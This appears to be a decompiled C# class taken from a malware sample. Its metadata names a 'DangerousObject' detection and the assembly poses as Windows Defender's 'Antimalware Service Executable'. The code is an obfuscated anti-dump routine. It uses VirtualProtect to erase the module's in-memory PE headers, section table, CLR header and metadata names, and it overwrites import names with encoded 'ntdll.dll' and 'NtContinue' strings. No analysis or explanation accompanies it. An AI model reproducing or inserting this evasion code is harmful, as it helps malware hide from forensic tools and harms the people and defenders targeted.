// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Antimalware Service Executable, Version=4.18.2110.6, Culture=neutral, PublicKeyToken=null
// MVID: BAA675AC-450F-4411-0EC7-1781EC73690A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-DangerousObject.Multi.Generic-1b75e4ffe67a5c5a8939c62c1028556f3995341d39f5aed9129637646f7b6e5f.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;

internal sealed class \u000E\u2000 : \u0008\u2000
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern unsafe bool \u0002(
    byte* _param0,
    int _param1,
    uint _param2,
    out uint _param3);

  internal static unsafe void \u0002()
  {
    Module module = typeof (\u000E\u2000).Module;
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
    byte* numPtr1 = hinstance + 60;
    byte* numPtr2 = hinstance + *(uint*) numPtr1 + 6;
    ushort length = *(ushort*) numPtr2;
    byte* numPtr3 = numPtr2 + 14;
    ushort num1 = *(ushort*) numPtr3;
    byte* destination = numPtr3 + 4 + (int) num1;
    byte* numPtr4 = stackalloc byte[11];
    if (module.FullyQualifiedName[0] != '<')
    {
      byte* numPtr5 = hinstance + *(uint*) (destination - 16);
      uint num2;
      if (*(uint*) (destination - 120) != 0U)
      {
        byte* numPtr6 = hinstance + *(uint*) (destination - 120);
        byte* numPtr7 = hinstance + *(uint*) numPtr6;
        byte* numPtr8 = hinstance + *(uint*) (numPtr6 + 12);
        byte* numPtr9 = hinstance + *(uint*) numPtr7 + 2;
        \u000E\u2000.\u0002(numPtr8, 11, 64U, out num2);
        *(int*) numPtr4 = 1818522734;
        *(int*) (numPtr4 + 4) = 1818504812;
        *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
        numPtr4[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          numPtr8[index] = numPtr4[index];
        \u000E\u2000.\u0002(numPtr9, 11, 64U, out num2);
        *(int*) numPtr4 = 1866691662;
        *(int*) (numPtr4 + 4) = 1852404846;
        *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
        numPtr4[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          numPtr9[index] = numPtr4[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        \u000E\u2000.\u0002(destination, 8, 64U, out num2);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
        destination += 40;
      }
      \u000E\u2000.\u0002(numPtr5, 72, 64U, out num2);
      byte* numPtr10 = hinstance + *(uint*) (numPtr5 + 8);
      *(int*) numPtr5 = 0;
      *(int*) (numPtr5 + 4) = 0;
      *(int*) (numPtr5 + (new IntPtr(2) * 4).ToInt64()) = 0;
      *(int*) (numPtr5 + (new IntPtr(3) * 4).ToInt64()) = 0;
      \u000E\u2000.\u0002(numPtr10, 4, 64U, out num2);
      *(int*) numPtr10 = 0;
      byte* numPtr11 = numPtr10 + 12;
      byte* numPtr12 = (byte*) ((ulong) (numPtr11 + *(uint*) numPtr11) + 7UL & 18446744073709551612UL) + 2;
      ushort num3 = (ushort) *numPtr12;
      byte* numPtr13 = numPtr12 + 2;
      for (int index1 = 0; index1 < (int) num3; ++index1)
      {
        \u000E\u2000.\u0002(numPtr13, 8, 64U, out num2);
        numPtr13 = numPtr13 + 4 + 4;
        for (int index2 = 0; index2 < 8; ++index2)
        {
          \u000E\u2000.\u0002(numPtr13, 4, 64U, out num2);
          *numPtr13 = (byte) 0;
          byte* numPtr14 = numPtr13 + 1;
          if (*numPtr14 == (byte) 0)
          {
            numPtr13 = numPtr14 + 3;
            break;
          }
          *numPtr14 = (byte) 0;
          byte* numPtr15 = numPtr14 + 1;
          if (*numPtr15 == (byte) 0)
          {
            numPtr13 = numPtr15 + 2;
            break;
          }
          *numPtr15 = (byte) 0;
          byte* numPtr16 = numPtr15 + 1;
          if (*numPtr16 == (byte) 0)
          {
            numPtr13 = numPtr16 + 1;
            break;
          }
          *numPtr16 = (byte) 0;
          numPtr13 = numPtr16 + 1;
        }
      }
    }
    else
    {
      uint num4 = *(uint*) (destination - 16);
      uint num5 = *(uint*) (destination - 120);
      uint[] numArray1 = new uint[(int) length];
      uint[] numArray2 = new uint[(int) length];
      uint[] numArray3 = new uint[(int) length];
      uint num6;
      for (int index = 0; index < (int) length; ++index)
      {
        \u000E\u2000.\u0002(destination, 8, 64U, out num6);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
        numArray1[index] = *(uint*) (destination + 12);
        numArray2[index] = *(uint*) (destination + 8);
        numArray3[index] = *(uint*) (destination + 20);
        destination += 40;
      }
      if (num5 != 0U)
      {
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray1[index] <= num5 && num5 < numArray1[index] + numArray2[index])
          {
            num5 = num5 - numArray1[index] + numArray3[index];
            break;
          }
        }
        byte* numPtr17 = hinstance + num5;
        uint num7 = *(uint*) numPtr17;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray1[index] <= num7 && num7 < numArray1[index] + numArray2[index])
          {
            num7 = num7 - numArray1[index] + numArray3[index];
            break;
          }
        }
        byte* numPtr18 = hinstance + num7;
        uint num8 = *(uint*) (numPtr17 + 12);
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray1[index] <= num8 && num8 < numArray1[index] + numArray2[index])
          {
            num8 = num8 - numArray1[index] + numArray3[index];
            break;
          }
        }
        uint num9 = *(uint*) numPtr18 + 2U;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray1[index] <= num9 && num9 < numArray1[index] + numArray2[index])
          {
            num9 = num9 - numArray1[index] + numArray3[index];
            break;
          }
        }
        \u000E\u2000.\u0002(hinstance + num8, 11, 64U, out num6);
        *(int*) numPtr4 = 1818522734;
        *(int*) (numPtr4 + 4) = 1818504812;
        *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
        numPtr4[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          (hinstance + num8)[index] = numPtr4[index];
        \u000E\u2000.\u0002(hinstance + num9, 11, 64U, out num6);
        *(int*) numPtr4 = 1866691662;
        *(int*) (numPtr4 + 4) = 1852404846;
        *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
        numPtr4[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          (hinstance + num9)[index] = numPtr4[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] <= num4 && num4 < numArray1[index] + numArray2[index])
        {
          num4 = num4 - numArray1[index] + numArray3[index];
          break;
        }
      }
      byte* numPtr19 = hinstance + num4;
      \u000E\u2000.\u0002(numPtr19, 72, 64U, out num6);
      uint num10 = *(uint*) (numPtr19 + 8);
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] <= num10 && num10 < numArray1[index] + numArray2[index])
        {
          num10 = num10 - numArray1[index] + numArray3[index];
          break;
        }
      }
      *(int*) numPtr19 = 0;
      *(int*) (numPtr19 + 4) = 0;
      *(int*) (numPtr19 + (new IntPtr(2) * 4).ToInt64()) = 0;
      *(int*) (numPtr19 + (new IntPtr(3) * 4).ToInt64()) = 0;
      byte* numPtr20 = hinstance + num10;
      \u000E\u2000.\u0002(numPtr20, 4, 64U, out num6);
      *(int*) numPtr20 = 0;
      byte* numPtr21 = numPtr20 + 12;
      byte* numPtr22 = (byte*) ((ulong) (numPtr21 + *(uint*) numPtr21) + 7UL & 18446744073709551612UL) + 2;
      ushort num11 = (ushort) *numPtr22;
      byte* numPtr23 = numPtr22 + 2;
      for (int index3 = 0; index3 < (int) num11; ++index3)
      {
        \u000E\u2000.\u0002(numPtr23, 8, 64U, out num6);
        numPtr23 = numPtr23 + 4 + 4;
        for (int index4 = 0; index4 < 8; ++index4)
        {
          \u000E\u2000.\u0002(numPtr23, 4, 64U, out num6);
          *numPtr23 = (byte) 0;
          byte* numPtr24 = numPtr23 + 1;
          if (*numPtr24 == (byte) 0)
          {
            numPtr23 = numPtr24 + 3;
            break;
          }
          *numPtr24 = (byte) 0;
          byte* numPtr25 = numPtr24 + 1;
          if (*numPtr25 == (byte) 0)
          {
            numPtr23 = numPtr25 + 2;
            break;
          }
          *numPtr25 = (byte) 0;
          byte* numPtr26 = numPtr25 + 1;
          if (*numPtr26 == (byte) 0)
          {
            numPtr23 = numPtr26 + 1;
            break;
          }
          *numPtr26 = (byte) 0;
          numPtr23 = numPtr26 + 1;
        }
      }
    }
  }
}
